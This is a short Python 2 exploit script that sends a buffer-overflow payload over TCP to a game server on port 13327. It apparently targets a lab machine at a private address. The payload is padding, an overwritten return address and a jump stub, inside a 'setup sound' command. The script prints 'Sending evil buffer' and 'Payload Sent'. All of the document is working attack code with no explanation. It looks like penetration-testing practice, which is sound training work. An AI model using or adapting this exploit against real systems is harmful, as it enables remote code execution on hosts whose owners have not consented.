#!/usr/bin/python2

import socket

host='192.168.56.111'

crash='A'*4368 + '\x97\x45\x13\x08' + '\x83\xc0\x0c\xff\xe0\x90\x90'

buffer='\x11(setup sound ' + crash +'\x90\x00#'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print  'Sending evil buffer...'
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print('Payload Sent')

